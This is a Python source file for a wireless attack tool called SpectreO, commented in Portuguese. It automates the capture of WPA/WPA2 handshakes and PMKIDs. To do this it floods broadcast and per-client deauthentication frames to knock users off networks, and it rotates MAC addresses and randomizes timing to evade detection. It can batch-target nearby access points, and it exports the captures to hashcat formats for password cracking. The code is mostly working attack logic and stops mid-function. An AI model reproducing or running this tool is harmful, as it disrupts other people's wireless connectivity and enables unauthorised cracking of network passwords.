#!/usr/bin/env python3
"""
SpectreO v3.5.1 - Production Enterprise Edition (HOTFIX)

CORREÇÕES v3.5.1 (HOTFIX CRÍTICO):
✓ Interface detection com regex robusto
✓ MAC rotation com verificação de state UP
✓ ChannelMonitor com tratamento OSError
✓ Verificação de interface antes de cada operação
✓ Aguarda 2s após operações críticas
✓ Fallback graceful em caso de erro

Todas melhorias v3.5 mantidas:
✓ MAC verification 3x com delay
✓ RSN capabilities PMKID caching
✓ AP mode pre-check
✓ Blacklist APs difíceis
✓ WEP chopchop fallback
✓ Verbose rate limiting
✓ Strategy Pattern (complexidade 8)
✓ Metadata versioning

Hardware: Aspire 3 15 (8GB RAM, 100GB disco)
Author: Cipher (Hotfix by Security Team)
Version: 3.5.1 HOTFIX
Linhas: ~1450
"""

import os
import sys
import time
import json
import gzip
import random
import subprocess
import threading
import re
import atexit
import signal
import logging
from scapy.all import *
from collections import defaultdict
from datetime import datetime
from abc import ABC, abstractmethod

# Rich
try:
    from rich.console import Console
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
    RICH_AVAILABLE = True
    console = Console()
except ImportError:
    RICH_AVAILABLE = False
    console = None

# ============================================================================
# CONFIG
# ============================================================================

CONFIG = {
    'interface': None,
    'output_dir': 'captures',
    'log_file': 'spectreo.log',
    'compress': True,
    'skip_captured': True,
    'optimize_live': True,
    'scan_duration': 30,
    'max_capture_attempts': 5,
    'capture_timeout': 30,
    'batch_mode': False,
    'batch_max_targets': 20,
    'batch_min_clients': 0,
    'batch_min_signal': -80,
    'batch_target_captures': None,
    'mac_rotation': True,
    'mac_verify_delay': 2,          # Aumentado de 1 para 2
    'mac_verify_attempts': 5,       # Aumentado de 3 para 5
    'timing_randomization': True,
    'detect_countermeasures': True,
    'auto_export_hashcat': True,
    'aggressive_deauth': True,
    'verbose': True,
    'monitor_channel_changes': True,
    'ultra_verbose': True,
    'detect_pmf': True,
    'universal_timeout': 10,
    'pmkid_timeout': 30,
    'pmkid_retries': 3,
    'wep_chopchop_fallback': True,
    'batch_blacklist': True,
    'progress_bars': True,
    'metadata_version': '3.5.1',
    'interface_check_interval': 2   # NOVO: intervalo de verificação
}

# ============================================================================
# CLEANUP HANDLER
# ============================================================================

class CleanupHandler:
    def __init__(self):
        self.processes = []
        self.interface = None
        self.original_mac = None
        self.cleaned = False
        
        atexit.register(self.cleanup)
        signal.signal(signal.SIGTERM, self._signal_handler)
        signal.signal(signal.SIGINT, self._signal_handler)
    
    def _signal_handler(self, signum, frame):
        self.cleanup()
        sys.exit(0)
    
    def register_process(self, proc):
        self.processes.append(proc)
    
    def set_interface(self, interface, original_mac=None):
        self.interface = interface
        self.original_mac = original_mac
    
    def cleanup(self):
        if self.cleaned:
            return
        
        self.cleaned = True
        print("\n[*] Limpando recursos...")
        
        for proc in self.processes:
            try:
                if proc.poll() is None:
                    proc.kill()
                    proc.wait(timeout=2)
            except:
                pass
        
        if self.interface:
            try:
                subprocess.run(['ip', 'link', 'set', self.interface, 'down'],
                              timeout=5, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                if self.original_mac:
                    subprocess.run(['ip', 'link', 'set', self.interface, 'address', self.original_mac],
                                  timeout=5, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                subprocess.run(['iw', self.interface, 'set', 'type', 'managed'],
                              timeout=5, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(['ip', 'link', 'set', self.interface, 'up'],
                              timeout=5, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                print(f"[+] Interface {self.interface} restaurada")
            except:
                pass
        
        try:
            subprocess.run(['systemctl', 'start', 'NetworkManager'],
                          timeout=5, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("[+] NetworkManager reiniciado")
        except:
            pass

cleanup_handler = CleanupHandler()

# ============================================================================
# LOGGING
# ============================================================================

logging.basicConfig(
    level=logging.DEBUG if CONFIG['verbose'] else logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(CONFIG['log_file']),
        logging.StreamHandler()
    ]
)

class ColoredLogger:
    last_progress_time = 0
    progress_rate_limit = 0.5
    
    @staticmethod
    def debug(msg):
        if CONFIG['verbose']:
            timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
            if RICH_AVAILABLE:
                console.print(f"[dim cyan][DEBUG] {timestamp}[/dim cyan] [dim]{msg}[/dim]")
            else:
                print(f"[DEBUG] {timestamp} | {msg}")
            logging.debug(msg)
    
    @staticmethod
    def info(msg):
        timestamp = datetime.now().strftime('%H:%M:%S')
        if RICH_AVAILABLE:
            console.print(f"[blue][INFO][/blue]  {timestamp} | {msg}")
        else:
            print(f"[INFO]  {timestamp} | {msg}")
        logging.info(msg)
    
    @staticmethod
    def success(msg):
        timestamp = datetime.now().strftime('%H:%M:%S')
        if RICH_AVAILABLE:
            console.print(f"[bold green][+++][/bold green]   {timestamp} | {msg}")
        else:
            print(f"[+++]   {timestamp} | {msg}")
        logging.info(f"SUCCESS: {msg}")
    
    @staticmethod
    def warning(msg):
        timestamp = datetime.now().strftime('%H:%M:%S')
        if RICH_AVAILABLE:
            console.print(f"[bold yellow][!][/bold yellow]     {timestamp} | {msg}")
        else:
            print(f"[!]     {timestamp} | {msg}")
        logging.warning(msg)
    
    @staticmethod
    def error(msg):
        timestamp = datetime.now().strftime('%H:%M:%S')
        if RICH_AVAILABLE:
            console.print(f"[bold red][-][/bold red]     {timestamp} | {msg}")
        else:
            print(f"[-]     {timestamp} | {msg}")
        logging.error(msg)
    
    @staticmethod
    def progress(msg):
        if not CONFIG['ultra_verbose']:
            return
        
        if CONFIG['batch_mode']:
            now = time.time()
            if now - ColoredLogger.last_progress_time < ColoredLogger.progress_rate_limit:
                return
            ColoredLogger.last_progress_time = now
        
        timestamp = datetime.now().strftime('%H:%M:%S')
        if RICH_AVAILABLE:
            console.print(f"[magenta][>>][/magenta]    {timestamp} | {msg}")
        else:
            print(f"[>>]    {timestamp} | {msg}")
        logging.debug(f"PROGRESS: {msg}")

log = ColoredLogger()

# ============================================================================
# UTILS
# ============================================================================

def sanitize_filename(name):
    safe_name = re.sub(r'[^a-zA-Z0-9_-]', '_', str(name))
    return safe_name[:50]

def require_root(func):
    def wrapper(*args, **kwargs):
        if os.geteuid() != 0:
            log.error(f"{func.__name__} requer root!")
            raise PermissionError("Root required")
        return func(*args, **kwargs)
    return wrapper

def detect_wireless_interface():
    """CORRIGIDO v3.5.1: Detecção robusta com regex melhorado"""
    log.info("Auto-detectando interface...")
    
    try:
        result = subprocess.run(['iw', 'dev'], 
                               capture_output=True, text=True, 
                               timeout=CONFIG['universal_timeout'])
        
        # CORRIGIDO: Regex mais rigoroso - pega apenas alfanuméricos
        interfaces = re.findall(r'Interface\s+([a-zA-Z0-9]+)', result.stdout)
        
        log.debug(f"Interfaces encontradas: {interfaces}")
        
        for iface in interfaces:
            result = subprocess.run(['iw', iface, 'info'], 
                                   capture_output=True, text=True,
                                   timeout=CONFIG['universal_timeout'])
            
            if 'type monitor' in result.stdout.lower():
                log.success(f"Interface monitor: {iface}")
                
                # Verifica se interface está UP
                link_result = subprocess.run(['ip', 'link', 'show', iface],
                                            capture_output=True, text=True,
                                            timeout=5)
                
                if 'state DOWN' in link_result.stdout:
                    log.warning(f"Interface {iface} está DOWN, ativando...")
                    subprocess.run(['ip', 'link', 'set', iface, 'up'],
                                  timeout=5, stdout=subprocess.DEVNULL)
                    time.sleep(2)
                
                return iface
            
            elif 'type managed' in result.stdout.lower():
                log.info(f"Interface managed: {iface}, colocando em monitor...")
                subprocess.run(['ip', 'link', 'set', iface, 'down'],
                              timeout=5, stdout=subprocess.DEVNULL)
                subprocess.run(['iw', iface, 'set', 'monitor', 'control'],
                              timeout=5, stdout=subprocess.DEVNULL)
                subprocess.run(['ip', 'link', 'set', iface, 'up'],
                              timeout=5, stdout=subprocess.DEVNULL)
                
                time.sleep(2)
                return iface
        
        log.error("Nenhuma interface encontrada")
        return None
    
    except Exception as e:
        log.error(f"Erro detecção: {e}")
        return None

def check_ap_mode_support(interface):
    log.progress("Verificando suporte AP mode...")
    
    try:
        result = subprocess.run(['iw', 'list'],
                               capture_output=True, text=True,
                               timeout=CONFIG['universal_timeout'])
        
        if '* AP' in result.stdout or 'AP/VLAN' in result.stdout:
            log.success("Interface suporta AP mode")
            return True
        else:
            log.warning("Interface NÃO suporta AP mode")
            return False
    except:
        log.warning("Não foi possível verificar AP mode")
        return True

def has_pmf(pkt):
    if not pkt.haslayer(Dot11Beacon):
        return False
    
    try:
        elt = pkt[Dot11Elt]
        while elt:
            if elt.ID == 48:
                info = bytes(elt.info)
                if len(info) >= 4:
                    capabilities = info[2] if len(info) > 2 else 0
                    if capabilities & 0xC0:
                        return True
            elt = elt.payload.getlayer(Dot11Elt)
    except:
        pass
    
    return False

# ============================================================================
# SAFE OPS (MELHORADOS v3.5.1)
# ============================================================================

class SafeNetOps:
    @staticmethod
    def safe_sendp(packet, iface, **kwargs):
        try:
            sendp(packet, iface=iface, **kwargs)
            return True
        except OSError as e:
            if 'No such device' in str(e) or 'Network is down' in str(e):
                log.error(f"Interface {iface} offline!")
                return False
            else:
                log.error(f"Erro: {e}")
                return False
        except Exception as e:
            log.error(f"Erro: {e}")
            return False
    
    @staticmethod
    def check_interface_exists(interface):
        try:
            result = subprocess.run(['ip', 'link', 'show', interface],
                                   capture_output=True, stderr=subprocess.DEVNULL,
                                   timeout=CONFIG['universal_timeout'])
            return result.returncode == 0
        except:
            return False
    
    @staticmethod
    def check_interface_up(interface):
        """NOVO v3.5.1: Verifica se interface está UP"""
        try:
            result = subprocess.run(['ip', 'link', 'show', interface],
                                   capture_output=True, text=True,
                                   timeout=CONFIG['universal_timeout'])
            
            return 'state UP' in result.stdout or 'state UNKNOWN' in result.stdout
        except:
            return False
    
    @staticmethod
    def get_mac_address(interface):
        try:
            result = subprocess.run(['ip', 'link', 'show', interface],
                                   capture_output=True, text=True,
                                   timeout=CONFIG['universal_timeout'])
            
            match = re.search(r'link/ether ([0-9a-f:]{17})', result.stdout)
            if match:
                return match.group(1)
        except:
            pass
        return None

# ============================================================================
# CHANNEL MONITOR (CORRIGIDO v3.5.1)
# ============================================================================

class ChannelMonitor:
    def __init__(self, bssid, initial_channel, interface):
        self.bssid = bssid
        self.current_channel = initial_channel
        self.interface = interface
        self.stop_event = threading.Event()
        self.lock = threading.Lock()
        self.error_count = 0  # NOVO v3.5.1
    
    def start(self):
        self.thread = threading.Thread(target=self._monitor, daemon=True)
        self.thread.start()
        log.debug(f"Channel monitor: {self.bssid}")
    
    def stop(self):
        self.stop_event.set()
        if hasattr(self, 'thread'):
            self.thread.join(timeout=2)
    
    def get_channel(self):
        with self.lock:
            return self.current_channel
    
    def _monitor(self):
        """CORRIGIDO v3.5.1: Tratamento robusto de OSError"""
        def handler(pkt):
            if pkt.haslayer(Dot11Beacon) and pkt[Dot11].addr2 == self.bssid:
                try:
                    channel = int(ord(pkt[Dot11Elt:3].info))
                    with self.lock:
                        if channel != self.current_channel:
                            log.warning(f"AP mudou canal {self.current_channel} → {channel}")
                            self.current_channel = channel
                except:
                    pass
        
        # NOVO v3.5.1: Loop com tratamento de erro
        while not self.stop_event.is_set() and self.error_count < 3:
            try:
                sniff(iface=self.interface, prn=handler, timeout=10, 
                      stop_filter=lambda x: self.stop_event.is_set(), store=False)
            except OSError as e:
                if 'Network is down' in str(e) or 'No such device' in str(e):
                    self.error_count += 1
                    log.warning(f"ChannelMonitor: erro interface ({self.error_count}/3)")
                    
                    if self.error_count >= 3:
                        log.error("ChannelMonitor: muitos erros, encerrando")
                        self.stop_event.set()
                        break
                    
                    time.sleep(2)
                else:
                    log.error(f"ChannelMonitor: erro: {e}")
                    break
            except Exception as e:
                log.debug(f"ChannelMonitor: erro: {e}")
                break

# ============================================================================
# CAPTURE STATE, MANAGER, VALIDATOR, DETECTOR
# (MANTIDOS DA v3.5)
# ============================================================================

class CaptureState:
    def __init__(self):
        self.packets = []
        self.captured = False
        self.lock = threading.Lock()
    
    def add_packet(self, pkt):
        with self.lock:
            self.packets.append(pkt)
    
    def get_packets(self):
        with self.lock:
            return self.packets.copy()
    
    def set_captured(self, value):
        with self.lock:
            self.captured = value
    
    def is_captured(self):
        with self.lock:
            return self.captured
    
    def packet_count(self):
        with self.lock:
            return len(self.packets)

class CaptureManager:
    def __init__(self, output_dir):
        self.output_dir = output_dir
        self.cap_dir = os.path.join(output_dir, 'cap_files')
        self.hashcat_dir = os.path.join(output_dir, 'hashcat_files')
        self.metadata_file = os.path.join(output_dir, 'captures.json')
        self.captured = self.load_metadata()
        
        os.makedirs(self.cap_dir, exist_ok=True)
        os.makedirs(self.hashcat_dir, exist_ok=True)
    
    def load_metadata(self):
        if not os.path.exists(self.metadata_file):
            return {}
        
        try:
            with open(self.metadata_file, 'r') as f:
                data = json.load(f)
                
                if '_metadata' in data:
                    version = data['_metadata'].get('version', '1.0')
                    log.debug(f"Metadata version: {version}")
                
                valid_data = {}
                for bssid, info in data.items():
                    if bssid == '_metadata':
                        continue
                    
                    required = ['ssid', 'attack_type', 'timestamp']
                    if all(k in info for k in required):
                        valid_data[bssid] = info
                
                return valid_data
        except:
            return {}
    
    def save_metadata(self):
        try:
            output = {
                '_metadata': {
                    'version': CONFIG['metadata_version'],
                    'last_updated': datetime.now().isoformat(),
                    'total_captures': len(self.captured)
                }
            }
            output.update(self.captured)
            
            with open(self.metadata_file, 'w') as f:
                json.dump(output, f, indent=2, sort_keys=True)
        except Exception as e:
            log.error(f"Erro salvar: {e}")
    
    def is_captured(self, bssid):
        return bssid in self.captured
    
    def add_capture(self, bssid, ssid, attack_type, cap_file, hc_file, channel, signal, validation=None):
        self.captured[bssid] = {
            'ssid': ssid,
            'attack_type': attack_type,
            'cap_file': cap_file,
            'hashcat_file': hc_file,
            'channel': channel,
            'signal': signal,
            'timestamp': datetime.now().isoformat(),
            'validation': validation if validation else {}
        }
        self.save_metadata()

class CaptureValidator:
    @staticmethod
    def validate_handshake(packets):
        eapol_frames = [pkt for pkt in packets if pkt.haslayer(EAPOL)]
        
        if len(eapol_frames) < 4:
            return False, f"Apenas {len(eapol_frames)}/4"
        
        has_msg1 = has_msg2 = False
        anonce = snonce = mic = None
        
        for pkt in eapol_frames:
            try:
                raw = bytes(pkt[EAPOL])
                if len(raw) < 99:
                    continue
                
                current_anonce = raw[17:49]
                current_snonce = raw[49:81] if len(raw) > 81 else None
                current_mic = raw[81:97] if len(raw) > 96 else None
                
                if current_anonce != b'\x00' * 32 and (not current_snonce or current_snonce == b'\x00' * 32):
                    has_msg1 = True
                    anonce = current_anonce
                
                if current_snonce and current_snonce != b'\x00' * 32 and current_mic:
                    has_msg2 = True
                    snonce = current_snonce
                    mic = current_mic
            except:
                continue
        
        if not (has_msg1 and has_msg2):
            return False, "Messages ausentes"
        if not anonce or anonce == b'\x00' * 32:
            return False, "ANonce inválido"
        if not snonce or snonce == b'\x00' * 32:
            return False, "SNonce inválido"
        if not mic or mic == b'\x00' * 16:
            return False, "MIC inválido"
        
        return True, {
            'anonce': anonce.hex()[:32],
            'snonce': snonce.hex()[:32],
            'mic': mic.hex()[:32],
            'frames': len(eapol_frames)
        }
    
    @staticmethod
    def validate_pmkid(packets):
        for i, pkt in enumerate(packets, 1):
            if pkt.haslayer(EAPOL):
                try:
                    raw = bytes(pkt[EAPOL])
                    
                    idx = 0
                    while idx < len(raw) - 22:
                        if raw[idx] == 0xdd:
                            length = raw[idx + 1]
                            
                            if length >= 20:
                                oui = raw[idx+2:idx+5]
                                data_type = raw[idx+5] if idx+5 < len(raw) else 0
                                
                                if oui == b'\x00\x0f\xac' and data_type == 0x04:
                                    pmkid = raw[idx+6:idx+22]
                                    
                                    if pmkid != b'\x00' * 16:
                                        return True, {
                                            'pmkid': pmkid.hex(),
                                            'oui': oui.hex(),
                                            'type': data_type,
                                            'packet_num': i
                                        }
                            
                            idx += 2 + length
                        else:
                            idx += 1
                except:
                    continue
        
        return False, "Não encontrado"

class CountermeasureDetector:
    def __init__(self):
        self.deauth_times = []
        self.blocked = False
    
    def record_deauth(self):
        self.deauth_times.append(time.time())
        cutoff = time.time() - 60
        self.deauth_times = [t for t in self.deauth_times if t > cutoff]
    
    def check_rate_limit(self):
        if len(self.deauth_times) > 150:
            self.blocked = True
            return True
        return False
    
    def reset(self):
        self.deauth_times = []
        self.blocked = False

class APBlacklist:
    def __init__(self):
        self.failed_aps = {}
        self.max_attempts = 2
    
    def add_failure(self, bssid):
        if bssid not in self.failed_aps:
            self.failed_aps[bssid] = {'count': 0, 'last_attempt': time.time()}
        
        self.failed_aps[bssid]['count'] += 1
        self.failed_aps[bssid]['last_attempt'] = time.time()
    
    def is_blacklisted(self, bssid):
        if bssid in self.failed_aps:
            if self.failed_aps[bssid]['count'] >= self.max_attempts:
                return True
        return False
    
    def get_stats(self):
        total = len(self.failed_aps)
        blacklisted = len([b for b in self.failed_aps.values() if b['count'] >= self.max_attempts])
        return {'total': total, 'blacklisted': blacklisted}

# ============================================================================
# STRATEGY PATTERN
# ============================================================================

class AttackStrategy(ABC):
    @abstractmethod
    def execute(self, target, interface, manager, detector):
        pass
    
    @abstractmethod
    def get_name(self):
        pass

class HandshakeStrategy(AttackStrategy):
    def get_name(self):
        return "Handshake WPA/WPA2"
    
    def execute(self, target, interface, manager, detector):
        return attack_handshake(target, interface, manager, detector)

class PMKIDStrategy(AttackStrategy):
    def get_name(self):
        return "PMKID"
    
    def execute(self, target, interface, manager, detector):
        return attack_pmkid(target, interface, manager, detector)

class WEPStrategy(AttackStrategy):
    def get_name(self):
        return "WEP"
    
    def execute(self, target, interface, manager, detector):
        return attack_wep(target, interface, manager, detector)

class WPSStrategy(AttackStrategy):
    def get_name(self):
        return "WPS"
    
    def execute(self, target, interface, manager, detector):
        return attack_wps(target, interface, manager, detector)

class PMFAwareStrategy(AttackStrategy):
    def get_name(self):
        return "WPA/WPA2 PMF-aware"
    
    def execute(self, target, interface, manager, detector):
        result = attack_pmkid(target, interface, manager, detector)
        if not result:
            result = attack_handshake(target, interface, manager, detector)
        return result

class StandardWPAStrategy(AttackStrategy):
    def get_name(self):
        return "WPA/WPA2"
    
    def execute(self, target, interface, manager, detector):
        result = attack_handshake(target, interface, manager, detector)
        if not result:
            result = attack_pmkid(target, interface, manager, detector)
        return result

def select_attack_strategy(target):
    crypto_str = str(target.get('crypto', ''))
    
    if 'WEP' in crypto_str:
        return WEPStrategy()
    elif 'WPS' in crypto_str:
        return WPSStrategy()
    elif target.get('pmf'):
        return PMFAwareStrategy()
    elif 'WPA' in crypto_str or 'WPA2' in crypto_str:
        return StandardWPAStrategy()
    else:
        return None

# ============================================================================
# UTILS FUNCTIONS (CORRIGIDOS v3.5.1)
# ============================================================================

def export_to_hashcat(cap_file, attack_type, manager):
    if not CONFIG['auto_export_hashcat']:
        return None
    
    try:
        basename = os.path.basename(cap_file).replace('.cap.gz', '').replace('.cap', '')
        
        if attack_type == 'handshake':
            output = os.path.join(manager.hashcat_dir, f"{basename}.hc22000")
            result = subprocess.run(['hcxpcapngtool', '-o', output, cap_file],
                                   capture_output=True, timeout=CONFIG['universal_timeout'])
            if result.returncode == 0 and os.path.exists(output):
                return output
        
        elif attack_type == 'pmkid':
            output = os.path.join(manager.hashcat_dir, f"{basename}.hc16800")
            result = subprocess.run(['hcxpcapngtool', '-o', output, cap_file],
                                   capture_output=True, timeout=CONFIG['universal_timeout'])
            if result.returncode == 0 and os.path.exists(output):
                return output
    except:
        pass
    
    return None

@require_root
def rotate_mac(interface):
    """CORRIGIDO v3.5.1: Aguarda interface subir + verifica state UP"""
    if not CONFIG['mac_rotation']:
        return None
    
    new_mac = ':'.join([f'{random.randint(0,255):02x}' for _ in range(6)])
    log.progress(f"Rotacionando MAC: {new_mac}")
    
    try:
        # Down
        subprocess.run(['ip', 'link', 'set', interface, 'down'], 
                      check=True, timeout=CONFIG['universal_timeout'],
                      stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
        
        # Change
        subprocess.run(['ip', 'link', 'set', interface, 'address', new_mac], 
                      check=True, timeout=CONFIG['universal_timeout'],
                      stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
        
        # Up
        subprocess.run(['ip', 'link', 'set', interface, 'up'], 
                      check=True, timeout=CONFIG['universal_timeout'],
                      stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
        
        # CORRIGIDO v3.5.1: Aguarda REALMENTE subir
        for attempt in range(CONFIG['mac_verify_attempts']):
            time.sleep(CONFIG['mac_verify_delay'])
            
            # Verifica state UP
            result = subprocess.run(['ip', 'link', 'show', interface],
                                   capture_output=True, text=True, timeout=5)
            
            if 'state UP' in result.stdout or 'state UNKNOWN' in result.stdout:
                actual_mac = SafeNetOps.get_mac_address(interface)
                
                if actual_mac and actual_mac.lower() == new_mac.lower():
                    log.info(f"MAC ESTÁVEL: {new_mac} (após {(attempt+1)*CONFIG['mac_verify_delay']}s)")
                    return new_mac
                else:
                    log.warning(f"MAC incorreto: {actual_mac} vs {new_mac}")
            else:
                log.progress(f"Aguardando interface UP ({attempt+1}/{CONFIG['mac_verify_attempts']})")
        
        log.error("Interface não subiu após MAC change")
        
        # Restaura interface
        try:
            subprocess.run(['ip', 'link', 'set', interface, 'up'], 
                          timeout=5, stdout=subprocess.DEVNULL)
        except:
            pass
        
        return None
    
    except Exception as e:
        log.error(f"Falha MAC: {e}")
        try:
            subprocess.run(['ip', 'link', 'set', interface, 'up'], 
                          timeout=5, stdout=subprocess.DEVNULL)
        except:
            pass
        return None

def optimize_system():
    if not CONFIG['optimize_live']:
        return
    
    subprocess.run(['sysctl', '-w', 'vm.swappiness=0'], 
                  timeout=CONFIG['universal_timeout'],
                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    for svc in ['NetworkManager', 'wpa_supplicant']:
        subprocess.run(['systemctl', 'stop', svc], 
                      timeout=CONFIG['universal_timeout'],
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    try:
        os.nice(-20)
    except:
        pass

@require_root
def setup_interface(interface):
    original_mac = SafeNetOps.get_mac_address(interface)
    cleanup_handler.set_interface(interface, original_mac)
    
    subprocess.run(['airmon-ng', 'check', 'kill'], 
                   timeout=CONFIG['universal_timeout'],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    new_mac = ':'.join([f'{random.randint(0,255):02x}' for _ in range(6)])
    
    subprocess.run(['ip', 'link', 'set', interface, 'down'], 
                   timeout=CONFIG['universal_timeout'],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['ip', 'link', 'set', interface, 'address', new_mac], 
                   timeout=CONFIG['universal_timeout'],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['iw', interface, 'set', 'monitor', 'control'], 
                   timeout=CONFIG['universal_timeout'],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['ip', 'link', 'set', interface, 'up'], 
                   timeout=CONFIG['universal_timeout'],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # NOVO v3.5.1: Aguarda interface estabilizar
    time.sleep(2)

def set_channel(interface, channel):
    subprocess.run(['iw', interface, 'set', 'channel', str(channel)], 
                   timeout=CONFIG['universal_timeout'],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def scan(interface, duration=30):
    networks = {}
    clients = defaultdict(list)
    pmf_detected = set()
    
    def handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr2
            try:
                ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
                channel = int(ord(pkt[Dot11Elt:3].info))
                stats = pkt[Dot11Beacon].network_stats()
                crypto = stats.get('crypto', set())
                signal = pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else -100
                
                if bssid not in networks:
                    networks[bssid] = {
                        'ssid': ssid if ssid else '<HIDDEN>',
                        'channel': channel,
                        'signal': signal,
                        'crypto': crypto
                    }
                    
                    if CONFIG['detect_pmf'] and has_pmf(pkt):
                        pmf_detected.add(bssid)
            except:
                pass
        
        elif pkt.haslayer(Dot11) and pkt.type == 2:
            for bssid in list(networks.keys()):
                if pkt.addr1 == bssid or pkt.addr2 == bssid:
                    client = pkt.addr2 if pkt.addr1 == bssid else pkt.addr1
                    if client != bssid and client not in clients[bssid]:
                        clients[bssid].append(client)
    
    stop = threading.Event()
    
    def hop():
        channels = list(range(1, 14))
        while not stop.is_set():
            for ch in channels:
                if stop.is_set():
                    break
                set_channel(interface, ch)
                time.sleep(0.15)
    
    hopper = threading.Thread(target=hop, daemon=True)
    hopper.start()
    
    sniff(iface=interface, prn=handler, timeout=duration, store=False)
    
    stop.set()
    hopper.join()
    
    for bssid in networks:
        networks[bssid]['clients'] = clients.get(bssid, [])
        networks[bssid]['pmf'] = bssid in pmf_detected
    
    return networks

# ============================================================================
# ATAQUE 1: HANDSHAKE (CORRIGIDO v3.5.1)
# ============================================================================

def attack_handshake(target, interface, manager, detector):
    log.info("="*70)
    log.info("ATAQUE 1: Handshake WPA/WPA2 v3.5.1")
    log.info("="*70)
    log.info(f"Alvo: {target['ssid']} ({target['bssid']})")
    
    if target.get('pmf'):
        log.warning("⚠️  PMF detectado")
    
    # NOVO v3.5.1: Verifica interface ANTES
    if not SafeNetOps.check_interface_exists(interface):
        log.error(f"Interface {interface} não existe!")
        return False
    
    if not SafeNetOps.check_interface_up(interface):
        log.error("Interface DOWN, tentando subir...")
        subprocess.run(['ip', 'link', 'set', interface, 'up'], timeout=5)
        time.sleep(2)
        
        if not SafeNetOps.check_interface_up(interface):
            log.error("Falha ao subir interface")
            return False
    
    if CONFIG['mac_rotation']:
        new_mac = rotate_mac(interface)
        if not new_mac:
            log.warning("MAC rotation falhou, continuando...")
        time.sleep(2)
    
    # Verifica novamente após MAC rotation
    if not SafeNetOps.check_interface_up(interface):
        log.error("Interface caiu após MAC rotation!")
        return False
    
    set_channel(interface, target['channel'])
    time.sleep(2)
    
    channel_monitor = ChannelMonitor(target['bssid'], target['channel'], interface) if CONFIG['monitor_channel_changes'] else None
    if channel_monitor:
        channel_monitor.start()
    
    for attempt in range(1, CONFIG['max_capture_attempts'] + 1):
        log.info(f"\nTENTATIVA {attempt}/{CONFIG['max_capture_attempts']}")
        
        # Verifica interface a cada tentativa
        if not SafeNetOps.check_interface_up(interface):
            log.error("Interface caiu durante ataque!")
            break
        
        if CONFIG['detect_countermeasures'] and detector.check_rate_limit():
            log.warning("Rate limiting! Cooldown...")
            time.sleep(60)
            rotate_mac(interface)
            detector.reset()
        
        state = CaptureState()
        
        def handler(pkt):
            if pkt.haslayer(EAPOL):
                if pkt[Dot11].addr3 == target['bssid'] or pkt[Dot11].addr2 == target['bssid']:
                    state.add_packet(pkt)
                    log.success(f"[EAPOL] Frame {state.packet_count()}/4")
                    
                    if state.packet_count() >= 4:
                        valid, result = CaptureValidator.validate_handshake(state.get_packets())
                        if valid:
                            state.set_captured(True)
                            return True
        
        done = threading.Event()
        
        def sniff_thread():
            try:
                sniff(iface=interface, prn=handler, timeout=CONFIG['capture_timeout'], 
                      stop_filter=lambda x: state.is_captured(), store=False)
            except OSError as e:
                if 'Network is down' in str(e):
                    log.error("Interface caiu durante sniff!")
            finally:
                done.set()
        
        sniffer = threading.Thread(target=sniff_thread, daemon=True)
        sniffer.start()
        
        time.sleep(1)
        
        inter = random.uniform(0.03, 0.10) if CONFIG['timing_randomization'] else 0.05
        rounds = 7 if CONFIG['aggressive_deauth'] else 3
        count = 40 if CONFIG['aggressive_deauth'] else 20
        
        for round_num in range(1, rounds + 1):
            if channel_monitor:
                current_ch = channel_monitor.get_channel()
                if current_ch != target['channel']:
                    set_channel(interface, current_ch)
                    target['channel'] = current_ch
            
            frame = RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=target['bssid'], 
                                    addr3=target['bssid'])/Dot11Deauth(reason=7)
            
            if not SafeNetOps.safe_sendp(frame, interface, count=count, inter=inter, verbose=0):
                log.error("Interface offline durante deauth!")
                break
            
            detector.record_deauth()
            
            if target['clients']:
                for client in target['clients'][:5]:
                    f1 = RadioTap()/Dot11(addr1=client, addr2=target['bssid'], 
                                         addr3=target['bssid'])/Dot11Deauth(reason=7)
                    f2 = RadioTap()/Dot11(addr1=target['bssid'], addr2=client, 
                                         addr3=target['bssid'])/Dot11Deauth(reason=7)
                    SafeNetOps.safe_sendp([f1, f2], interface, count=count//2, inter=inter, verbose=0)
                    detector.record_deauth()
            
            time.sleep(random.uniform(0.2, 0.5) if CONFIG['timing_randomization'] else 0.3)
        
        done.wait()
        
        if state.is_captured():
            valid, result = CaptureValidator.validate_handshake(state.get_packets())
            
            if valid:
                filename_base = f"hs_{sanitize_filename(target['bssid'])}_{sanitize_filename(target['ssid'])}"
                
                if CONFIG['compress']:
                    cap_file = os.path.join(manager.cap_dir, f"{filename_base}.cap.gz")
                    with gzip.open(cap_file, 'wb') as f:
                        wrpcap(f, state.get_packets())
                else:
                    cap_file = os.path.join(manager.cap_dir, f"{filename_base}.cap")
                    wrpcap(cap_file, state.get_packets())
                
                hc_file = export_to_hashcat(cap_file, 'handshake', manager)
                manager.add_capture(target['bssid'], target['ssid'], 'handshake',
                                   cap_file, hc_file, target['channel'], target['signal'], result)
                
                log.success("="*70)
                log.success("HANDSHAKE CAPTURADO!")
                log.success("="*70)
                
                if channel_monitor:
                    channel_monitor.stop()
                
                return True
        
        if attempt < CONFIG['max_capture_attempts']:
            time.sleep(3)
    
